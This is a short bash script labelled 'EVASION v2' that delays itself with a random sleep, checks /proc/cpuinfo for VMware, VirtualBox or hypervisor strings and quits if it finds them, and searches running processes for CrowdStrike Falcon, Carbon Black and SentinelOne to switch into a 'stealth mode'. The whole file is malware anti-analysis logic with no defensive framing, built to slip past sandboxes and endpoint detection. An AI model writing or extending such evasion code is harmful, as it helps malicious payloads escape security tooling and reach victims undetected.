#!/bin/bash
echo "[EVASION v2] Checking environment..."
sleep $((15 + RANDOM % 30))
grep -q "hypervisor\|VMware\|VirtualBox" /proc/cpuinfo 2>/dev/null && { echo "Sandbox — exit"; exit 0; }
ps aux | grep -qi "falcon\|carbonblack\|crowdstrike\|sentinel" && { echo "EDR detected — stealth mode"; sleep 60; }
echo "Clean"
